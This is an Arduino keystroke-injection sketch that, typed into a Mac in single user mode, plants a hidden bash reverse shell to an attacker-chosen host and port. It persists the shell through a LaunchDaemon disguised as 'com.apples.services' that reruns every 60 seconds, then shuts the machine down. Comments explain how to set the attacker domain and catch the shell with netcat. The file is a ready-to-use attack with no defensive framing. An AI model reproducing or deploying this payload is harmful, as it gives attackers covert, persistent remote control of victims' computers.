//edited: @hidesec (GITHUB)

#include <HID-Project.h>
#include <HID-Settings.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  AbsoluteMouse.begin();
  Keyboard.begin();

  // Start Payload
 
  // A simple script for rooting OSX from single user mode.

  // Change situs_kamu.com to your domain name or IP address
  
  // Change 1337 to Your port
  
  // Catch the shell with 'nc -l -p 1337'

  delay(1000);

  Keyboard.print("mount -uw /");

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.print("mkdir /Library/.hidden");

  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("echo '#!/bin/bash");

  typeKey(KEY_RETURN);

  Keyboard.print("bash -i >& /dev/tcp/situs_kamu.com/1337 0>&1");

  typeKey(KEY_RETURN);

  Keyboard.print("wait' > /Library/.hidden/connect.sh");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("chmod +x /Library/.hidden/connect.sh");

  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("mkdir /Library/LaunchDaemons");

  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("echo '<plist version=\"1.0\">");

  typeKey(KEY_RETURN);

  Keyboard.print("<dict>");

  typeKey(KEY_RETURN);

  Keyboard.print("<key>Label</key>");

  typeKey(KEY_RETURN);

  Keyboard.print("<string>com.apples.services</string>");

  typeKey(KEY_RETURN);

  Keyboard.print("<key>ProgramArguments</key>");

  typeKey(KEY_RETURN);

  Keyboard.print("<array>");

  typeKey(KEY_RETURN);

  Keyboard.print("<string>/bin/sh</string>");

  typeKey(KEY_RETURN);

  Keyboard.print("<string>/Library/.hidden/connect.sh</string>");

  typeKey(KEY_RETURN);

  Keyboard.print("</array>");

  typeKey(KEY_RETURN);

  Keyboard.print("<key>RunAtLoad</key>");

  typeKey(KEY_RETURN);

  Keyboard.print("<true/>");

  typeKey(KEY_RETURN);

  Keyboard.print("<key>StartInterval</key>");

  typeKey(KEY_RETURN);

  Keyboard.print("<integer>60</integer>");

  typeKey(KEY_RETURN);

  Keyboard.print("<key>AbandonProcessGroup</key>");

  typeKey(KEY_RETURN);

  Keyboard.print("<true/>");

  typeKey(KEY_RETURN);

  Keyboard.print("</dict>");

  typeKey(KEY_RETURN);

  Keyboard.print("</plist>' > /Library/LaunchDaemons/com.apples.services.plist");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("chmod 600 /Library/LaunchDaemons/com.apples.services.plist");

  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("launchctl load /Library/LaunchDaemons/com.apples.services.plist");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("shutdown -h now");

  typeKey(KEY_RETURN);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
  AbsoluteMouse.end();
}

// Unused
void loop() {}